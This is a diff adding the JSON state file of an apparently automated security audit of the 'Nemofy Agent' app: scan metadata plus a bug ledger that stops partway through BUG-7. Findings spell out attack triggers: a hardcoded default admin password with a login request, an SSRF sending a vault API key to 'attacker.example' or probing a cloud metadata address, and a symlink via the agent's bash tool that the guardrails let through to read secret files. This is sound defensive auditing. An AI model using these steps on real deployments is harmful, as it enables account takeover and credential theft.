@@ -1,0 +1,1151 @@
+{
+  "schemaVersion": 3,
+  "generation": 21,
+  "mode": "local-sequential",
+  "createdAt": "2026-11-21T14:49:13.067Z",
+  "updatedAt": "2026-11-21T17:36:58.481Z",
+  "chunkSize": 9,
+  "maxSourceTokens": 48000,
+  "enforceTokenBudget": true,
+  "runtime": {
+    "parallelDisabled": false
+  },
+  "metrics": {
+    "filesTotal": 49,
+    "filesScanned": 49,
+    "chunksTotal": 7,
+    "chunksDone": 7,
+    "findingsTotal": 20,
+    "findingsUnique": 20,
+    "lowConfidenceFindings": 0
+  },
+  "chunks": [
+    {
+      "id": "chunk-1",
+      "files": [
+        "Nemofy Agent/src/components/LoginGate.tsx",
+        "Nemofy Agent/src/lib/authValidation.ts",
+        "server.ts",
+        "server/agentProcessManager.ts",
+        "server/authStore.ts",
+        "server/configStore.ts",
+        "server/profileVault.ts",
+        "server/providerCatalog.ts",
+        "Agent-Core/agent_core/api.py"
+      ],
+      "estimatedSourceTokens": 44663,
+      "oversized": false,
+      "status": "done",
+      "retries": 1,
+      "startedAt": "2026-11-21T15:14:06.569Z",
+      "completedAt": "2026-11-21T15:17:03.600Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-2",
+      "files": [
+        "Agent-Core/agent_core/models.py",
+        "Agent-Core/agent_core/state.py",
+        "Nemofy Agent/src/components/ModelSelectorCombobox.tsx",
+        "Nemofy Agent/src/lib/apiClient.ts",
+        "Agent-Core/agent_core/__init__.py",
+        "Agent-Core/agent_core/context_manager.py"
+      ],
+      "estimatedSourceTokens": 33914,
+      "oversized": false,
+      "status": "done",
+      "retries": 1,
+      "startedAt": "2026-11-21T15:17:03.777Z",
+      "completedAt": "2026-11-21T16:44:41.411Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-3",
+      "files": [
+        "Agent-Core/agent_core/graph.py",
+        "Agent-Core/agent_core/guardrails.py",
+        "Agent-Core/agent_core/jobs.py",
+        "Agent-Core/agent_core/multimodal.py",
+        "Agent-Core/agent_core/planner.py"
+      ],
+      "estimatedSourceTokens": 43208,
+      "oversized": false,
+      "status": "done",
+      "retries": 1,
+      "startedAt": "2026-11-21T16:44:41.515Z",
+      "completedAt": "2026-11-21T16:56:21.529Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-4",
+      "files": [
+        "Agent-Core/agent_core/sandbox.py",
+        "Agent-Core/agent_core/skills.py",
+        "Agent-Core/agent_core/subagents.py",
+        "Agent-Core/agent_core/tools/__init__.py",
+        "Agent-Core/agent_core/tools/local.py",
+        "Agent-Core/main.py",
+        "MCPs/__init__.py",
+        "MCPs/manager.py",
+        "Nemofy Agent/src/App.tsx"
+      ],
+      "estimatedSourceTokens": 25743,
+      "oversized": false,
+      "status": "done",
+      "retries": 1,
+      "startedAt": "2026-11-21T16:56:21.637Z",
+      "completedAt": "2026-11-21T16:56:21.961Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-5",
+      "files": [
+        "Nemofy Agent/src/components/AgentActivityPanel.tsx",
+        "Nemofy Agent/src/components/ChatView.tsx",
+        "Nemofy Agent/src/components/ContextUsageRing.tsx",
+        "Nemofy Agent/src/components/FilesystemView.tsx",
+        "Nemofy Agent/src/components/MarkdownMessage.tsx",
+        "Nemofy Agent/src/components/NemofyLogo.tsx"
+      ],
+      "estimatedSourceTokens": 32754,
+      "oversized": false,
+      "status": "done",
+      "retries": 1,
+      "startedAt": "2026-11-21T16:56:22.053Z",
+      "completedAt": "2026-11-21T17:36:40.810Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-6",
+      "files": [
+        "Nemofy Agent/src/components/SettingsView.tsx",
+        "Nemofy Agent/src/components/Sidebar.tsx",
+        "Nemofy Agent/src/lib/activityUtils.ts",
+        "Nemofy Agent/src/lib/contextUtils.ts",
+        "Nemofy Agent/src/lib/filesystemUtils.ts",
+        "Nemofy Agent/src/lib/llmPresets.ts",
+        "Nemofy Agent/src/lib/markdownRenderer.ts",
+        "Nemofy Agent/src/lib/scrollUtils.ts",
+        "Nemofy Agent/src/lib/thinkingModes.ts"
+      ],
+      "estimatedSourceTokens": 38266,
+      "oversized": false,
+      "status": "done",
+      "retries": 0,
+      "startedAt": null,
+      "completedAt": "2026-11-21T17:36:41.015Z",
+      "lastError": null
+    },
+    {
+      "id": "chunk-7",
+      "files": [
+        "Nemofy Agent/src/main.tsx",
+        "Nemofy Agent/src/types/agent.ts",
+        "Nemofy Agent/vite.config.ts",
+        "src/main.tsx",
+        "vite.config.ts"
+      ],
+      "estimatedSourceTokens": 2135,
+      "oversized": false,
+      "status": "done",
+      "retries": 0,
+      "startedAt": null,
+      "completedAt": "2026-11-21T17:36:41.289Z",
+      "lastError": null
+    }
+  ],
+  "fileStates": {
+    "Nemofy Agent/src/components/LoginGate.tsx": {
+      "status": "scanned",
+      "initialHash": "02591fcf3c42948dd7624a20aedfdac228c735e8866f240165a5256e30551607",
+      "updatedAt": "2026-11-21T17:36:58.461Z",
+      "hash": "02591fcf3c42948dd7624a20aedfdac228c735e8866f240165a5256e30551607"
+    },
+    "Nemofy Agent/src/lib/authValidation.ts": {
+      "status": "scanned",
+      "initialHash": "a0c2e7dd40b96b3c233a3007da6cbfe2dfba437747656dfc9c40e9316d57431b",
+      "updatedAt": "2026-11-21T17:36:58.462Z",
+      "hash": "a0c2e7dd40b96b3c233a3007da6cbfe2dfba437747656dfc9c40e9316d57431b"
+    },
+    "server.ts": {
+      "status": "scanned",
+      "initialHash": "661b613bf82cd34da577a0de7a76352e44b3606efe6d808c768be2a660106309",
+      "updatedAt": "2026-11-21T17:36:58.462Z",
+      "hash": "661b613bf82cd34da577a0de7a76352e44b3606efe6d808c768be2a660106309"
+    },
+    "server/agentProcessManager.ts": {
+      "status": "scanned",
+      "initialHash": "80b93dbbd43a714d911073b9b68e770928991443afcbc75155b7a17f218ee5c1",
+      "updatedAt": "2026-11-21T17:36:58.462Z",
+      "hash": "80b93dbbd43a714d911073b9b68e770928991443afcbc75155b7a17f218ee5c1"
+    },
+    "server/authStore.ts": {
+      "status": "scanned",
+      "initialHash": "2ddff5fd008d5c6475afeabc25a1587122734141f5dc94d7f02ce771965b9d25",
+      "updatedAt": "2026-11-21T17:36:58.462Z",
+      "hash": "2ddff5fd008d5c6475afeabc25a1587122734141f5dc94d7f02ce771965b9d25"
+    },
+    "server/configStore.ts": {
+      "status": "scanned",
+      "initialHash": "0252c8bf7ddd6e079ee001a4fcc26b9ab4c930c4e5e0545e360b89d3a4a7c369",
+      "updatedAt": "2026-11-21T17:36:58.463Z",
+      "hash": "0252c8bf7ddd6e079ee001a4fcc26b9ab4c930c4e5e0545e360b89d3a4a7c369"
+    },
+    "server/profileVault.ts": {
+      "status": "scanned",
+      "initialHash": "803b633c39b783130b9f3d494d3ecb514d040e4b0b0a91be7d0113f9f6d4270b",
+      "updatedAt": "2026-11-21T17:36:58.463Z",
+      "hash": "803b633c39b783130b9f3d494d3ecb514d040e4b0b0a91be7d0113f9f6d4270b"
+    },
+    "server/providerCatalog.ts": {
+      "status": "scanned",
+      "initialHash": "70b111e5e30071857d6b089dcf059d9c07879c4d667b516603949a3a93734132",
+      "updatedAt": "2026-11-21T17:36:58.463Z",
+      "hash": "70b111e5e30071857d6b089dcf059d9c07879c4d667b516603949a3a93734132"
+    },
+    "Agent-Core/agent_core/api.py": {
+      "status": "scanned",
+      "initialHash": "6c4cada1aa13899c9a5a3221bb9cfd0572dddc71a259c78c0dcc11f7aade61c7",
+      "updatedAt": "2026-11-21T17:36:58.463Z",
+      "hash": "6c4cada1aa13899c9a5a3221bb9cfd0572dddc71a259c78c0dcc11f7aade61c7"
+    },
+    "Agent-Core/agent_core/models.py": {
+      "status": "scanned",
+      "initialHash": "26a591cd19bbe16e19ce699dbdc9de8a31f9ba209c13996d78aa5d708c51008d",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "26a591cd19bbe16e19ce699dbdc9de8a31f9ba209c13996d78aa5d708c51008d"
+    },
+    "Agent-Core/agent_core/state.py": {
+      "status": "scanned",
+      "initialHash": "20b3caec0ab9cb0e1a4e071cdda13d80e549f23e084e82da202ae503f7fef52b",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "20b3caec0ab9cb0e1a4e071cdda13d80e549f23e084e82da202ae503f7fef52b"
+    },
+    "Nemofy Agent/src/components/ModelSelectorCombobox.tsx": {
+      "status": "scanned",
+      "initialHash": "4e076d6643b6bd59aec67696fca3562b0c8ff56e935a772ca753e1773d2c2800",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "4e076d6643b6bd59aec67696fca3562b0c8ff56e935a772ca753e1773d2c2800"
+    },
+    "Nemofy Agent/src/lib/apiClient.ts": {
+      "status": "scanned",
+      "initialHash": "7c1b141ca97de98490153648fb2fc5fedd279a8ac27f16340f98f3da0066d7cc",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "7c1b141ca97de98490153648fb2fc5fedd279a8ac27f16340f98f3da0066d7cc"
+    },
+    "Agent-Core/agent_core/__init__.py": {
+      "status": "scanned",
+      "initialHash": "8b453e27628cc94db8cfd7784e1a39da637dcf0acf247e599740cb2db781d8d5",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "8b453e27628cc94db8cfd7784e1a39da637dcf0acf247e599740cb2db781d8d5"
+    },
+    "Agent-Core/agent_core/context_manager.py": {
+      "status": "scanned",
+      "initialHash": "2df95e82287c2efbc04a21d97809aba3ee408e9ffcff6f4223b250a775e0f065",
+      "updatedAt": "2026-11-21T17:36:58.464Z",
+      "hash": "2df95e82287c2efbc04a21d97809aba3ee408e9ffcff6f4223b250a775e0f065"
+    },
+    "Agent-Core/agent_core/graph.py": {
+      "status": "scanned",
+      "initialHash": "67b88bef5125f07515e2e5333745af0d83ba7db40b5f49f5e4fbdd51ba0ff5f4",
+      "updatedAt": "2026-11-21T17:36:58.465Z",
+      "hash": "67b88bef5125f07515e2e5333745af0d83ba7db40b5f49f5e4fbdd51ba0ff5f4"
+    },
+    "Agent-Core/agent_core/guardrails.py": {
+      "status": "scanned",
+      "initialHash": "88fee40212e0a577ab8e4cdc8a8bcdef2dac1b949d086597098d187fe7513021",
+      "updatedAt": "2026-11-21T17:36:58.465Z",
+      "hash": "88fee40212e0a577ab8e4cdc8a8bcdef2dac1b949d086597098d187fe7513021"
+    },
+    "Agent-Core/agent_core/jobs.py": {
+      "status": "scanned",
+      "initialHash": "b40c795adf975d995f07126eb997fdf7260df62bcae0d1b2ddcd690d79837ad3",
+      "updatedAt": "2026-11-21T17:36:58.465Z",
+      "hash": "b40c795adf975d995f07126eb997fdf7260df62bcae0d1b2ddcd690d79837ad3"
+    },
+    "Agent-Core/agent_core/multimodal.py": {
+      "status": "scanned",
+      "initialHash": "321e79a26cf3af71a53d564a649454cd8be66f1bf785d6d3c124a6009e4feaae",
+      "updatedAt": "2026-11-21T17:36:58.465Z",
+      "hash": "321e79a26cf3af71a53d564a649454cd8be66f1bf785d6d3c124a6009e4feaae"
+    },
+    "Agent-Core/agent_core/planner.py": {
+      "status": "scanned",
+      "initialHash": "0dd8c28ae7f14adc0cae73e95d2071ecf6530da8c2b0bb71ec44e3f3ecc96cff",
+      "updatedAt": "2026-11-21T17:36:58.465Z",
+      "hash": "0dd8c28ae7f14adc0cae73e95d2071ecf6530da8c2b0bb71ec44e3f3ecc96cff"
+    },
+    "Agent-Core/agent_core/sandbox.py": {
+      "status": "scanned",
+      "initialHash": "74e10f494c7bee0016fde0cbc1ac3868e30ec31be7f3a20ca364b6f118f19e81",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "74e10f494c7bee0016fde0cbc1ac3868e30ec31be7f3a20ca364b6f118f19e81"
+    },
+    "Agent-Core/agent_core/skills.py": {
+      "status": "scanned",
+      "initialHash": "4b564ab0efb9285b7b7449fbdd29706f575b8ed21fef042373bbe48afbc0a8dd",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "4b564ab0efb9285b7b7449fbdd29706f575b8ed21fef042373bbe48afbc0a8dd"
+    },
+    "Agent-Core/agent_core/subagents.py": {
+      "status": "scanned",
+      "initialHash": "ff2d3682dd35f12fb9361525199c1f1ebf7b25466718549d60dd06cf5aaf5b54",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "ff2d3682dd35f12fb9361525199c1f1ebf7b25466718549d60dd06cf5aaf5b54"
+    },
+    "Agent-Core/agent_core/tools/__init__.py": {
+      "status": "scanned",
+      "initialHash": "4c8600366e1b61f1127a128fbcf13f46be6779b4c0b4d97dcccd9318e0a77906",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "4c8600366e1b61f1127a128fbcf13f46be6779b4c0b4d97dcccd9318e0a77906"
+    },
+    "Agent-Core/agent_core/tools/local.py": {
+      "status": "scanned",
+      "initialHash": "3892fa34160b96fc3e78757390a1397f5df268bdd7e527a45f76bea8f316394f",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "3892fa34160b96fc3e78757390a1397f5df268bdd7e527a45f76bea8f316394f"
+    },
+    "Agent-Core/main.py": {
+      "status": "scanned",
+      "initialHash": "342bc16210dfb78664a9806c9564e3f41a6a9470520349083d305994ca228adb",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "342bc16210dfb78664a9806c9564e3f41a6a9470520349083d305994ca228adb"
+    },
+    "MCPs/__init__.py": {
+      "status": "scanned",
+      "initialHash": "4562fbd7b3cce55ee2e26004caa27664c6d6f00a3929f26fe35b0b96eae3a6fc",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "4562fbd7b3cce55ee2e26004caa27664c6d6f00a3929f26fe35b0b96eae3a6fc"
+    },
+    "MCPs/manager.py": {
+      "status": "scanned",
+      "initialHash": "0d9dc7a89ba378fd65e0959d29c227f18665145c2b8e29704dfcfd2303a42536",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "0d9dc7a89ba378fd65e0959d29c227f18665145c2b8e29704dfcfd2303a42536"
+    },
+    "Nemofy Agent/src/App.tsx": {
+      "status": "scanned",
+      "initialHash": "a7df84523f529af7cd1b0c2763756e8ead9b6cc44dbcc2a7ce2a4c8676f3d5e7",
+      "updatedAt": "2026-11-21T17:36:58.466Z",
+      "hash": "a7df84523f529af7cd1b0c2763756e8ead9b6cc44dbcc2a7ce2a4c8676f3d5e7"
+    },
+    "Nemofy Agent/src/components/AgentActivityPanel.tsx": {
+      "status": "scanned",
+      "initialHash": "4b07b5499316c495f1d158b542a9560d2b1da9046bb1ec3a81632628d72f1e81",
+      "updatedAt": "2026-11-21T17:36:58.467Z",
+      "hash": "4b07b5499316c495f1d158b542a9560d2b1da9046bb1ec3a81632628d72f1e81"
+    },
+    "Nemofy Agent/src/components/ChatView.tsx": {
+      "status": "scanned",
+      "initialHash": "473a64aeae984fc8c4bcafad590313c63531c9509ad1208f4ff26440b0ed36cc",
+      "updatedAt": "2026-11-21T17:36:58.467Z",
+      "hash": "473a64aeae984fc8c4bcafad590313c63531c9509ad1208f4ff26440b0ed36cc"
+    },
+    "Nemofy Agent/src/components/ContextUsageRing.tsx": {
+      "status": "scanned",
+      "initialHash": "a0297498141bc10912fba12647dc2849ea9495b4db56aa5053f4afcd066d5491",
+      "updatedAt": "2026-11-21T17:36:58.468Z",
+      "hash": "a0297498141bc10912fba12647dc2849ea9495b4db56aa5053f4afcd066d5491"
+    },
+    "Nemofy Agent/src/components/FilesystemView.tsx": {
+      "status": "scanned",
+      "initialHash": "8d6ddefe0130f8074112de99c5ace8eef43fa7903211be33d890f33f05b9a1f3",
+      "updatedAt": "2026-11-21T17:36:58.473Z",
+      "hash": "8d6ddefe0130f8074112de99c5ace8eef43fa7903211be33d890f33f05b9a1f3"
+    },
+    "Nemofy Agent/src/components/MarkdownMessage.tsx": {
+      "status": "scanned",
+      "initialHash": "469a50dc70ea71316c6bbfc0907ba9ba57491ab83248b20df03f518eff9aafcf",
+      "updatedAt": "2026-11-21T17:36:58.475Z",
+      "hash": "469a50dc70ea71316c6bbfc0907ba9ba57491ab83248b20df03f518eff9aafcf"
+    },
+    "Nemofy Agent/src/components/NemofyLogo.tsx": {
+      "status": "scanned",
+      "initialHash": "15757e518e7ca2209ca02ad1a0fa65aa60a080a63a57ffd8372244bb79b897eb",
+      "updatedAt": "2026-11-21T17:36:58.476Z",
+      "hash": "15757e518e7ca2209ca02ad1a0fa65aa60a080a63a57ffd8372244bb79b897eb"
+    },
+    "Nemofy Agent/src/components/SettingsView.tsx": {
+      "status": "scanned",
+      "initialHash": "4a3d065809728b2b08cc9d5b5a5fba9c93d6d12e6a8e3dd248df5923a146e23b",
+      "updatedAt": "2026-11-21T17:36:58.477Z",
+      "hash": "4a3d065809728b2b08cc9d5b5a5fba9c93d6d12e6a8e3dd248df5923a146e23b"
+    },
+    "Nemofy Agent/src/components/Sidebar.tsx": {
+      "status": "scanned",
+      "initialHash": "ce95b7b072f32620bbaaa1369538636a472461177e7a83e2ff2fec9642eaec06",
+      "updatedAt": "2026-11-21T17:36:58.477Z",
+      "hash": "ce95b7b072f32620bbaaa1369538636a472461177e7a83e2ff2fec9642eaec06"
+    },
+    "Nemofy Agent/src/lib/activityUtils.ts": {
+      "status": "scanned",
+      "initialHash": "189c681ad369f8762412e8109c2cb62d0a39982f534efb0e1c6b1c87d87c5650",
+      "updatedAt": "2026-11-21T17:36:58.477Z",
+      "hash": "189c681ad369f8762412e8109c2cb62d0a39982f534efb0e1c6b1c87d87c5650"
+    },
+    "Nemofy Agent/src/lib/contextUtils.ts": {
+      "status": "scanned",
+      "initialHash": "28193523ed57a4e91877cc8322e285479cae6d8cc1020202973a7d55be146cad",
+      "updatedAt": "2026-11-21T17:36:58.477Z",
+      "hash": "28193523ed57a4e91877cc8322e285479cae6d8cc1020202973a7d55be146cad"
+    },
+    "Nemofy Agent/src/lib/filesystemUtils.ts": {
+      "status": "scanned",
+      "initialHash": "79b9646f167463d4bcfdf7de198657e57a6ce1c2e4823e0bcdbf28ed1dbec90f",
+      "updatedAt": "2026-11-21T17:36:58.478Z",
+      "hash": "79b9646f167463d4bcfdf7de198657e57a6ce1c2e4823e0bcdbf28ed1dbec90f"
+    },
+    "Nemofy Agent/src/lib/llmPresets.ts": {
+      "status": "scanned",
+      "initialHash": "fee509e1aa8b4483cf5526051eef216c10cedbde7def2e38d6e479308d01edd0",
+      "updatedAt": "2026-11-21T17:36:58.478Z",
+      "hash": "fee509e1aa8b4483cf5526051eef216c10cedbde7def2e38d6e479308d01edd0"
+    },
+    "Nemofy Agent/src/lib/markdownRenderer.ts": {
+      "status": "scanned",
+      "initialHash": "b449874a9fdcc376920070262558bdab2d73353a084fedc0fbfb2be3847279e3",
+      "updatedAt": "2026-11-21T17:36:58.478Z",
+      "hash": "b449874a9fdcc376920070262558bdab2d73353a084fedc0fbfb2be3847279e3"
+    },
+    "Nemofy Agent/src/lib/scrollUtils.ts": {
+      "status": "scanned",
+      "initialHash": "f59d80f5810e4e99ea8ca87c235540fbed5b850dad986abf89f11a40de25c0ba",
+      "updatedAt": "2026-11-21T17:36:58.479Z",
+      "hash": "f59d80f5810e4e99ea8ca87c235540fbed5b850dad986abf89f11a40de25c0ba"
+    },
+    "Nemofy Agent/src/lib/thinkingModes.ts": {
+      "status": "scanned",
+      "initialHash": "d491ae8aaeaaeb15b00da75c30cf148a73856e4938e7831db5de06740f81e51d",
+      "updatedAt": "2026-11-21T17:36:58.479Z",
+      "hash": "d491ae8aaeaaeb15b00da75c30cf148a73856e4938e7831db5de06740f81e51d"
+    },
+    "Nemofy Agent/src/main.tsx": {
+      "status": "scanned",
+      "initialHash": "e1c120c32af2d87592716adc070c2e732d1aec2451de2351cb3b72a279308d77",
+      "updatedAt": "2026-11-21T17:36:58.479Z",
+      "hash": "e1c120c32af2d87592716adc070c2e732d1aec2451de2351cb3b72a279308d77"
+    },
+    "Nemofy Agent/src/types/agent.ts": {
+      "status": "scanned",
+      "initialHash": "4ddd3ff5c0198524d93b054d0b046ce51799f1f5832e2a24163d3ebcd4aa7154",
+      "updatedAt": "2026-11-21T17:36:58.480Z",
+      "hash": "4ddd3ff5c0198524d93b054d0b046ce51799f1f5832e2a24163d3ebcd4aa7154"
+    },
+    "Nemofy Agent/vite.config.ts": {
+      "status": "scanned",
+      "initialHash": "653ec8b46928393067f5da360b3c2bbca97ec946a8cab10523f9651e5aeeff3f",
+      "updatedAt": "2026-11-21T17:36:58.480Z",
+      "hash": "653ec8b46928393067f5da360b3c2bbca97ec946a8cab10523f9651e5aeeff3f"
+    },
+    "src/main.tsx": {
+      "status": "scanned",
+      "initialHash": "d8773c81167d74e536803a02306198a7b46da2c1b507d0771777c303c36649e6",
+      "updatedAt": "2026-11-21T17:36:58.480Z",
+      "hash": "d8773c81167d74e536803a02306198a7b46da2c1b507d0771777c303c36649e6"
+    },
+    "vite.config.ts": {
+      "status": "scanned",
+      "initialHash": "3059c97ca1cd3226d4d3154e822734b842f0321ec19938bcbfa06dbc9c2ab272",
+      "updatedAt": "2026-11-21T17:36:58.481Z",
+      "hash": "3059c97ca1cd3226d4d3154e822734b842f0321ec19938bcbfa06dbc9c2ab272"
+    }
+  },
+  "bugLedger": [
+    {
+      "key": "server/authStore.ts|21-22|Hardcoded default administrator password is seeded whenever NEMOFY_ADMIN_PASSWORD is unset, and its unsalted SHA-256 digest is embedded in the client bundle.",
+      "bugId": "BUG-1",
+      "severity": "Critical",
+      "file": "server/authStore.ts",
+      "lines": "21-22",
+      "category": "security",
+      "claim": "Hardcoded default administrator password is seeded whenever NEMOFY_ADMIN_PASSWORD is unset, and its unsalted SHA-256 digest is embedded in the client bundle.",
+      "evidence": "server/authStore.ts:21-22 defines DEFAULT_PASSWORD = process.env.NEMOFY_ADMIN_PASSWORD || 'Rahul1234$' and seeds admin in loadOrSeed() (lines 78-88) when data/auth.json does not exist. NEMOFY_ADMIN_PASSWORD is also omitted from .env.example. Nemofy Agent/src/lib/authValidation.ts:3-4 embeds DEFAULT_STANDALONE_CREDENTIAL_DIGEST for the same default credential.",
+      "runtimeTrigger": "On any fresh deployment where NEMOFY_ADMIN_PASSWORD is not configured, an unauthenticated remote attacker sends POST /api/auth/login with {\"username\":\"admin\",\"password\":\"Rahul1234$\"} and obtains full administrator session access to workspace files, encrypted vault operations, and Agent-Core execution.",
+      "crossReferences": [
+        "server/authStore.ts:78-88",
+        "Nemofy Agent/src/lib/authValidation.ts:1-4",
+        "server.ts:238-262"
+      ],
+      "confidenceScore": 96,
+      "confidenceLabel": "high",
+      "stride": "Spoofing",
+      "cwe": "CWE-798",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.487Z"
+    },
+    {
+      "key": "server.ts|264-268|Unauthenticated POST /api/auth/logout clears all active provider API keys inside the running Agent-Core process.",
+      "bugId": "BUG-2",
+      "severity": "High",
+      "file": "server.ts",
+      "lines": "264-268",
+      "category": "security",
+      "claim": "Unauthenticated POST /api/auth/logout clears all active provider API keys inside the running Agent-Core process.",
+      "evidence": "server.ts:264-268 mounts app.post('/api/auth/logout', ...) without requireSession or isSameOriginMutation and unconditionally invokes callAgentCore('/config/secrets', { method: 'DELETE' }), which triggers Agent-Core/agent_core/api.py:455-460 to clear app.state.profile_secrets and pop every provider API key from os.environ.",
+      "runtimeTrigger": "Any unauthenticated client or cross-site web page issues POST /api/auth/logout, immediately wiping all hydrated LLM API keys from Agent-Core and causing active/subsequent authenticated agent runs to fail with missing API key errors.",
+      "crossReferences": [
+        "Agent-Core/agent_core/api.py:455-460",
+        "Agent-Core/agent_core/api.py:373-383"
+      ],
+      "confidenceScore": 95,
+      "confidenceLabel": "high",
+      "stride": "DoS",
+      "cwe": "CWE-306",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server/providerCatalog.ts|288-311|Arbitrary base_url in /api/settings/models and /api/settings/probe enables SSRF and exfiltration of decrypted profile vault API keys to attacker-controlled hosts.",
+      "bugId": "BUG-3",
+      "severity": "High",
+      "file": "server/providerCatalog.ts",
+      "lines": "288-311",
+      "category": "security",
+      "claim": "Arbitrary base_url in /api/settings/models and /api/settings/probe enables SSRF and exfiltration of decrypted profile vault API keys to attacker-controlled hosts.",
+      "evidence": "server.ts:1252-1300 passes caller-supplied base_url and decrypted profileSecrets into listProviderModelsDirect (server/providerCatalog.ts:288-311) and probeProviderModelDirect (lines 391-450). Only /^https?:\\/\\//i is checked; no private/loopback/metadata IP blocking or host allowlist is enforced, and resolveProviderApiKey (lines 80-103) attaches the decrypted server-side vault API key in Authorization/x-api-key headers to the arbitrary base_url.",
+      "runtimeTrigger": "An authenticated caller (or XSS payload) sends POST /api/settings/models with {\"provider\":\"openai\",\"base_url\":\"https://attacker.example/v1\"} (omitting api_key) to receive the decrypted OPENAI_API_KEY in the Authorization header on attacker.example, or sets base_url to http://169.254.169.254/latest/meta-data to probe internal/metadata endpoints.",
+      "crossReferences": [
+        "server.ts:1252-1300",
+        "server/providerCatalog.ts:80-103",
+        "server/providerCatalog.ts:379-450",
+        "Agent-Core/agent_core/api.py:518-552"
+      ],
+      "confidenceScore": 94,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-918",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server/configStore.ts|524-538|Workspace filesystem API resolves paths lexically without resolving symbolic links, allowing arbitrary host file read/write via symlinks inside /workspace.",
+      "bugId": "BUG-4",
+      "severity": "High",
+      "file": "server/configStore.ts",
+      "lines": "524-538",
+      "category": "security",
+      "claim": "Workspace filesystem API resolves paths lexically without resolving symbolic links, allowing arbitrary host file read/write via symlinks inside /workspace.",
+      "evidence": "server/configStore.ts:524-538 resolveWorkspacePath uses path.resolve(this.workspaceDir, clean) and never calls fs.realpathSync on existing targets or parent directories. readWorkspaceFile (lines 710-737), writeWorkspaceFile (lines 739-749), and listWorkspaceDirectory (lines 641-708) pass this lexical path directly to fs.statSync/readFileSync/writeFileSync/readdirSync, which follow symlinks out of /workspace.",
+      "runtimeTrigger": "If a symbolic link inside workspace/ points outside workspace/ (for example created via bash_exec 'ln -s ../data/auth.json leak.json', which is allowed as SAFE by guardrails.py and not blocked by _LOCAL_ESCAPE_PATTERNS in sandbox.py), GET /api/filesystem/file?path=leak.json returns data/auth.json (including sessionSecret and vaultMasterSecret), and PUT /api/filesystem/file overwrites the symlink target.",
+      "crossReferences": [
+        "server.ts:1027-1087",
+        "server/configStore.ts:641-761",
+        "Agent-Core/agent_core/sandbox.py:174-196"
+      ],
+      "confidenceScore": 94,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-59",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server.ts|462-596|Stale threads array loaded before awaiting long-running Agent-Core execution overwrites data/threads.json on completion, silently dropping concurrent threads and messages.",
+      "bugId": "BUG-5",
+      "severity": "High",
+      "file": "server.ts",
+      "lines": "462-596",
+      "category": "concurrency",
+      "claim": "Stale threads array loaded before awaiting long-running Agent-Core execution overwrites data/threads.json on completion, silently dropping concurrent threads and messages.",
+      "evidence": "In POST /api/chat/send (server.ts:462), threads is read from disk before awaiting callAgentCore('/agent/run') (line 512, up to 120s timeout), then the same stale threads array is written back at lines 558 and 596 via store.saveThreads(threads). POST /api/chat/jobs/start has the same pattern between line 677 and error write at line 774.",
+      "runtimeTrigger": "Start a request via POST /api/chat/send on thread A; while Agent-Core is executing, create thread B (POST /api/threads) or add a message in thread C; when thread A finishes, store.saveThreads(threads) overwrites data/threads.json with the pre-run snapshot, deleting thread B and thread C's new messages.",
+      "crossReferences": [
+        "server.ts:677-775",
+        "server/configStore.ts:1036-1048"
+      ],
+      "confidenceScore": 94,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server/authStore.ts|194-205|parseCookieHeader calls decodeURIComponent without error handling, causing uncaught URIError 500 failures on any request with a malformed percent-encoded cookie.",
+      "bugId": "BUG-6",
+      "severity": "Medium",
+      "file": "server/authStore.ts",
+      "lines": "194-205",
+      "category": "error-handling",
+      "claim": "parseCookieHeader calls decodeURIComponent without error handling, causing uncaught URIError 500 failures on any request with a malformed percent-encoded cookie.",
+      "evidence": "server/authStore.ts:201 executes decodeURIComponent(part.slice(idx + 1).trim()) with no try/catch for every cookie in the Cookie header. extractSessionToken (server.ts:96) calls parseCookieHeader on /api/auth/me and every requireSession route.",
+      "runtimeTrigger": "Send GET /api/auth/me with header 'Cookie: any=%E0%A4%A'; decodeURIComponent throws URIError: URI malformed, returning HTTP 500 instead of treating the cookie as invalid or unauthenticated.",
+      "crossReferences": [
+        "server.ts:90-98",
+        "server.ts:149-162",
+        "server.ts:221-236"
+      ],
+      "confidenceScore": 96,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server/authStore.ts|121-167|Stateless session tokens are never invalidated on logout, remaining valid for their full 24-hour TTL after the user signs out.",
+      "bugId": "BUG-7",
+      "severity": "Medium",
+      "file": "server/authStore.ts",
+      "lines": "121-167",
+      "category": "security",
+      "claim": "Stateless session tokens are never invalidated on logout, remaining valid for their full 24-hour TTL after the user signs out.",
